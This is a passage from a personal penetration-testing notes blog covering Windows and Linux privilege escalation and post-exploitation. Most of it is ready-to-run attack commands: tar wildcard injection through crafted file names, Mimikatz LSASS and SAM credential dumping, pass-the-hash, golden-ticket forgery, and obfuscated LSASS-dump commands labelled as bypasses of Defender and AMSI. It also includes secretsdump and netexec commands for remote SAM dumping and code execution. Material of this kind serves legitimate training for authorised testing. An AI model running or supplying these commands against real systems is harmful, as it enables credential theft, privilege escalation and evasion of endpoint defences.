+<h4 id="Service-DLL-Hijacking"><a href="#Service-DLL-Hijacking" class="headerlink" title="Service DLL Hijacking"></a><strong>Service DLL Hijacking</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;<span class="variable">$_</span>.State -like <span class="string">&#x27;Running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Name                      State   PathName</span><br><span class="line">----                      -----   --------</span><br><span class="line">...</span><br><span class="line">BetaService               Running C:\Users\foo\Documents\BetaServ.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>check running services</em></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\foo&gt; icacls .\Documents\BetaServ.exe</span><br><span class="line">.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)</span><br><span class="line">                         BUILTIN\Administrators:(F)</span><br><span class="line">                         client\foo:(RX)</span><br><span class="line">                         </span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>check permission of BetaServ.exe user foo can Read&#x2F;Write and Execute</em></li>
+</ul>
+<ul>
+<li><em>if we replace betaserv.exe with a malicious doppelganger, we can restart the service and execute our malicious file to escalate privileges</em></li>
+</ul>
+<br>
+
+<h4 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a><strong>Unquoted Service Paths</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName</span><br><span class="line"></span><br><span class="line"><span class="comment">#wmi as alternative</span></span><br><span class="line">wmic service get name,pathname |  findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>List of services with binary path</em></li>
+</ul>
+<h3 id="Automated-Privilege-Escalation"><a href="#Automated-Privilege-Escalation" class="headerlink" title="Automated Privilege Escalation"></a>Automated Privilege Escalation</h3><p> <strong>winPEAS</strong></p>
+<hr>
+<p>winPEAS is part of the <strong><em>PEASS - Privilege Escalation Awesome Scripts SUITE</em></strong> and can be downloaded from Github <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a>. </p>
+<p>There are 2 versions of winPEAS, a batch script and executable.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d <span class="number">1</span> t</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>if winPEASx64.exe doesnt show the color inside the ouput, try adding this regkey</em><br></li>
+</ul>
+<p><strong>LOLBAS</strong></p>
+<hr>
+<p>Living Off The Land Binaries and Scripts (and also Libraries) <a target="_blank" rel="noopener" href="https://lolbas-project.github.io/#">https://lolbas-project.github.io/#</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:LOLBAS-Project/LOLBAS.git</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+
+<br>
+
+<h2 id="Linux-PrivEsc"><a href="#Linux-PrivEsc" class="headerlink" title="Linux PrivEsc"></a><strong>Linux PrivEsc</strong></h2><br>
+
+<h3 id="Manual-Privilege-Escalation-1"><a href="#Manual-Privilege-Escalation-1" class="headerlink" title="Manual Privilege Escalation"></a>Manual Privilege Escalation</h3><hr>
+<br>
+
+<h4 id="Enumerate-OS"><a href="#Enumerate-OS" class="headerlink" title="Enumerate OS"></a>Enumerate OS</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get kernel version</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="comment">#gather release information and more enhanced info</span></span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br><span class="line"><span class="comment">#kernel version in detail</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"></span><br><span class="line"><span class="comment">#kernel version and architecture</span></span><br><span class="line"><span class="built_in">uname</span> -a </span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>enumerate Linux and its components</em></li>
+</ul>
+<br>
+
+<h4 id="Interesting-User-trails"><a href="#Interesting-User-trails" class="headerlink" title="Interesting  User trails"></a>Interesting  User trails</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print env variable</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="comment">#show enviorment variable</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#check bashrc config</span></span><br><span class="line"><span class="built_in">cat</span> .bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment">#check who has a bash shell</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -i <span class="string">&#x27;/bin/.*sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#check sudo capabilities of the current user</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Service-Footprinting"><a href="#Service-Footprinting" class="headerlink" title="Service Footprinting"></a>Service Footprinting</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#watch ps aux for a specific key word</span></span><br><span class="line">watch -n 1 <span class="string">&quot;ps -aux | grep pass&quot;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Cron-Jobs"><a href="#Cron-Jobs" class="headerlink" title="Cron Jobs"></a>Cron Jobs</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#list crontab</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="comment">#more detailed view</span></span><br><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br><span class="line"></span><br><span class="line"><span class="comment">#grep Cronjobs which were executed since the machine is online</span></span><br><span class="line">grep <span class="string">&quot;CRON&quot;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment">#abuse tar </span></span><br><span class="line">backup.tar.gz</span><br><span class="line"><span class="comment">#this will execute tar --checkpoint-action switch, once the tar cronjob runs</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint=1</span></span><br><span class="line"><span class="string">shell.sh</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Hijacking-SUID-binaries"><a href="#Hijacking-SUID-binaries" class="headerlink" title="Hijacking SUID binaries"></a>Hijacking SUID binaries</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#find suid that current user can run</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Hunt-for-interesting-files-permission"><a href="#Hunt-for-interesting-files-permission" class="headerlink" title="Hunt for interesting files permission"></a>Hunt for interesting files permission</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># all files owned by current user</span></span><br><span class="line">find / -user `<span class="built_in">whoami</span>` -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; \; 2&gt;/dev/null | grep -v <span class="string">&#x27;/proc/*\|/sys/*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># readable /root</span></span><br><span class="line"><span class="built_in">ls</span> -la /root ; <span class="built_in">ls</span> -l /home</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="Automated-Privilege-Escalation-1"><a href="#Automated-Privilege-Escalation-1" class="headerlink" title="Automated Privilege Escalation"></a>Automated Privilege Escalation</h3><hr>
+<p><strong>linpeas.sh</strong> is part of the <strong><em>PEASS - Privilege Escalation Awesome Scripts SUITE</em></strong> and can be downloaded from Github</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">https://github.com/peass-ng/PEASS-ng</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linpeas.sh </span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>execute linpeas</em></li>
+</ul>
+<h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h1><br>
+
+<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h2><br>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> .#####.   mimikatz 2.0 alpha (x86) release &quot;Kiwi en C&quot; (Apr  6 2014 22:02:03)</span><br><span class="line">.## ^ ##.</span><br><span class="line">## / \ ##  /* * *</span><br><span class="line">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line">&#x27;## v ##&#x27;   https://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line"> &#x27;#####&#x27;                                    with  13 modules * * */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Mimikatz, a tool by gentilkiwi to extract secrets from a windows machine</em></li>
+</ul>
+<br>
+
+<h4 id="Enable-logging-elevate-token"><a href="#Enable-logging-elevate-token" class="headerlink" title="Enable logging, elevate token"></a>Enable logging, elevate token</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#enable logging in currenty directory</span></span><br><span class="line">log</span><br><span class="line"></span><br><span class="line"><span class="comment">#get system, if not already</span></span><br><span class="line">token::elevate</span><br><span class="line"><span class="comment"># try to find a da token and elevate to it</span></span><br><span class="line">TOKEN::Elevate /domainadmin </span><br><span class="line"></span><br><span class="line"><span class="comment">#interact with a process of another user</span></span><br><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Ask-LSA-for-creds"><a href="#Ask-LSA-for-creds" class="headerlink" title="Ask LSA for creds"></a>Ask LSA for creds</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lsadump::lsa /patch</span><br><span class="line">lsadump::sam /patch</span><br><span class="line">lsadump::cache /patch</span><br></pre></td></tr></table></figure>
+
+<h4 id="sekurlsa"><a href="#sekurlsa" class="headerlink" title="sekurlsa"></a>sekurlsa</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"><span class="comment">#export available tickets, similar to klist</span></span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:corp.com /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="dump-user-hash"><a href="#dump-user-hash" class="headerlink" title="dump user hash"></a>dump user hash</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /inject /name:krbtgt</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>dump krbtgt ntlm hash</em><br></li>
+</ul>
+<h4 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># show tickets of users</span></span><br><span class="line">sekurlsa::tickets</span><br><span class="line"></span><br><span class="line"><span class="comment">#export tickets</span></span><br><span class="line">kerberos::list /export</span><br><span class="line"></span><br><span class="line"><span class="comment">#list kerberos credentials for all authenticated users</span></span><br><span class="line">SEKURLSA::Kerberos</span><br><span class="line"></span><br><span class="line"><span class="comment">#get NT HASH of krbtgt acc</span></span><br><span class="line">lsadump::dcsync /user:corp.com\krbtgt </span><br><span class="line"></span><br><span class="line"><span class="comment">#forge golden ticket using krbtgt hash</span></span><br><span class="line">kerberos::golden /user:hacker</span><br><span class="line">/domain:corp.com /sid:S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">/krbtgt:<span class="number">9</span>d765b482771505cbe97411065964d5f /sids:S<span class="literal">-1-</span></span><br><span class="line"><span class="number">5</span><span class="literal">-21-3842939050-3880317879-2865463114-519</span> /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>forge kerberos TGTs. golden ticket</em></li>
+</ul>
+<br>
+
+<h4 id="non-interactive-usage"><a href="#non-interactive-usage" class="headerlink" title="non interactive usage"></a>non interactive usage</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;log hash.txt&quot;</span> <span class="string">&quot;lsadump::lsa /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line">.\mimikatz.exe  <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::lsa /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">.\mimikatz.exe  <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::sam /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::cache /patch&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>use if you do not have a interactive shell</em></li>
+</ul>
+<h2 id="SAM-and-AD-Dumping"><a href="#SAM-and-AD-Dumping" class="headerlink" title="SAM and AD Dumping"></a><strong>SAM and AD Dumping</strong></h2><br>
+
+<h4 id="Lolbins-to-potentially-bypass-Defender-AMSI"><a href="#Lolbins-to-potentially-bypass-Defender-AMSI" class="headerlink" title="Lolbins to potentially bypass Defender &amp; AMSI"></a>Lolbins to potentially bypass Defender &amp; AMSI</h4><hr>
+<p>Procdump.exe, Privileges required User:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Detected</span></span><br><span class="line">procdump.exe -md calc.dll explorer.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bypass</span></span><br><span class="line">procdump.exe -&quot;m&quot;d&quot;e&quot;d&quot;w&quot; calc.dll explorer.exe</span><br></pre></td></tr></table></figure>
+
+<p>Comsvcs.dll, privileges required according to documentation SYSTEM</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Detected</span></span><br><span class="line">rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bypass</span></span><br><span class="line">rundll32 C:\windows\system32\comsvcs.dll MiniDump +[LSASS_PID] dump2.bin full</span><br><span class="line">rundll32 C:\windows\system32\comsvcs.dll MiniDump 0[LSASS_PID] dump3.bin full</span><br><span class="line">rundll32 comsvcs,`#65560 [LSASS_PID] dump4.bin full</span><br><span class="line">rundll32 comsvcs,`#24 [LSASS_PID] dump5.bin full</span><br><span class="line">rundll32 comsvcs,`#00024 [LSASS_PID] dump6.bin full</span><br></pre></td></tr></table></figure>
+
+<p>Dump.exe Privileges required Administrator</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">detected</span> </span><br><span class="line">dump64.exe [LSASS_PID] out.dmp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bypass</span></span><br><span class="line">dump64.exe 0[LSASS_PID] out.dmp</span><br></pre></td></tr></table></figure>
+
+<p>TTTracer.exe Privileges required Administrator</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">detected</span></span><br><span class="line">TTTracer.exe -dumpFull -attach [LSASS_PID]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bypass</span></span><br><span class="line">TTTracer.exe —dumpFull —attach [LSASS_PID]</span><br><span class="line"></span><br><span class="line">Source: https://www.unicodepedia.com/unicode/general-punctuation/2014/em-dash/</span><br></pre></td></tr></table></figure>
+
+<p>rdrleakdiag.exe privileges required, user</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">detected</span></span><br><span class="line">rdrleakdiag.exe /p [LSASS_PID] /o c:\evil /fullmemdmp /wait 1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bypass</span></span><br><span class="line">rdrleakdiag.exe /p [LSASS_PID] /o c:\evil /fullmemdmp /wait 1</span><br></pre></td></tr></table></figure>
+
+<p>Credentials dumping, Privileges required Administrator</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Detected</span></span><br><span class="line">reg save HKLM\SECURITY c:\test\security.bak &amp;&amp; reg save HKLM\SYSTEM c:\test\system.bak &amp;&amp; reg save HKLM\SAM c:\test\sam.bak</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bypass</span></span><br><span class="line">reg save HKLM∖SECURITY c:∖test∖security.bak &amp;&amp; reg save HKLM∖SYSTEM c:∖test∖system.bak &amp;&amp; reg save HKLM∖SAM c:∖test∖sam.bak</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Bypass</span></span><br><span class="line">reg save HKLM＼SECURITY c:＼test＼security.bak &amp;&amp; reg save HKLM＼SYSTEM c:＼test＼system.bak &amp;&amp; reg save HKLM＼SAM c:＼test＼sam.bak</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="Impacket-secretsdump"><a href="#Impacket-secretsdump" class="headerlink" title="Impacket-secretsdump"></a>Impacket-secretsdump</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Usage</span></span><br><span class="line">impacket-secretsdump oscp.prep\foo:password@DC01</span><br><span class="line"></span><br><span class="line"><span class="comment">#If you have SAM and SYSTEM file, you can use secretsdump to read them </span></span><br><span class="line">impacket-secretsdump -sam SAM -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>dump sam using secretsdump</em></li>
+</ul>
+<br>
+
+<h4 id="NXC-former-CrackMapExec"><a href="#NXC-former-CrackMapExec" class="headerlink" title="NXC former CrackMapExec"></a>NXC former CrackMapExec</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">     .   .</span><br><span class="line">    .|   |.     _   _          _     _____</span><br><span class="line">    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___</span><br><span class="line">    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|</span><br><span class="line">    .=[ ]=.    | |\  | |  __/ | |_  | |___   &gt;  &lt;  |  __/ | (__</span><br><span class="line">   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|</span><br><span class="line">   ॱ \   / ॱ</span><br><span class="line">     ॱ   ॱ</span><br><span class="line"></span><br><span class="line"><span class="comment">#dump sam on a Pwn3d machine</span></span><br><span class="line">nxc smb  10.10.10.10 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;Sh0wAdminsL0ve&#x27;</span> --local-auth --sam</span><br><span class="line"></span><br><span class="line">Available Protocols to Own stuff with</span><br><span class="line">  &#123;rdp,ssh,smb,ftp,ldap,mssql,wmi,winrm,vnc&#125;</span><br><span class="line"><span class="comment">#use ssh, smb, wmi,winrm to dump SAM</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Test code execution</span></span><br><span class="line">nxc smb  10.10.10.10 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;Sh0wAdminsL0ve&#x27;</span> -x <span class="string">&#x27;dir&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#remote enable rdp</span></span><br><span class="line"><span class="built_in">sudo</span> netexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=<span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#enumerate logged on users</span></span><br><span class="line">nxc smb 172.16.5.125 -u user -p pass --loggedon-users</span><br><span class="line"></span><br><span class="line"><span class="comment">#enumerate shares</span></span><br><span class="line">nxc smb 172.16.5.125 -u user -p pass --shares</span><br><span class="line"></span><br><span class="line"><span class="comment">#enumerate domain users</span></span><br><span class="line">nxc smb 172.16.5.125 -u user -p pass --<span class="built_in">users</span></span><br><span class="line"><span class="comment">#enumerat domain groups</span></span><br><span class="line">nxc smb 172.16.5.124 -u user -p pass --<span class="built_in">groups</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<br>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://0xbirb.github.io">Ludwig Schober</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://0xbirb.github.io/2024/05/23/2024-05-25-my-notes/">https://0xbirb.github.io/2024/05/23/2024-05-25-my-notes/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/notes/">notes</a><a class="post-meta__tags" href="/tags/enumeration/">enumeration</a><a class="post-meta__tags" href="/tags/shells/">shells</a><a class="post-meta__tags" href="/tags/exploitation/">exploitation</a><a class="post-meta__tags" href="/tags/privsec/">privsec</a></div><div class="post-share"><div class="social-share" data-image="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/06/29/2024-06-29-Creating%20my%20own%20HoneyPot%20with%20T-Pot/" title="Creating my own HoneyPot with T-Pot"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Creating my own HoneyPot with T-Pot</div></div><div class="info-2"><div class="info-item-1">System RequirmentsFor this project, i’ll be using a Virtual Private Server offered by the German cloud provider NetCup. You will learn how to install T-Pot, the all in one HoneyPot in this blog post.  My server has the following dimensions which are more than enough to satisfy the system requirments: - RAM 8,192MiB (8GB) - 4x CPU Cores of x86 Architecture - 160 GiB Harddrive    Setting up our serverFor the OS I choose Debian 12 with code name “Bookworm”. If you’re also using a VPS, I...</div></div></div></a><a class="pagination-related" href="/2024/04/23/2024-05-25-introduction-to-this-blog/" title="Introduction to this Blog"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Introduction to this Blog</div></div><div class="info-2"><div class="info-item-1">A few information about myself1234567┌──(bl4ckout㉿kali)-[~/0xbirb.github.io]└─$ whoami                                                                             0xbirb      	- infoSec addict	- passionate about security	- purple teamer    Links  GitHub HackTheBox   </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/08/21/2024-08-21-Vulnlab%20Forgotten%20-%20Writeup/" title="Vulnlab Forgotten - Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="info-item-2">Vulnlab Forgotten - Writeup</div></div><div class="info-2"><div class="info-item-1">Forgotten – writeup  A easy Linux machine on Vulnlab which involves abusing a unfinished installation of a web application, as well as a docker escape leading to a privilege escalation. EnumerationNMAP1./nmapAutomator.sh -H 10.10.78.216 --type Full  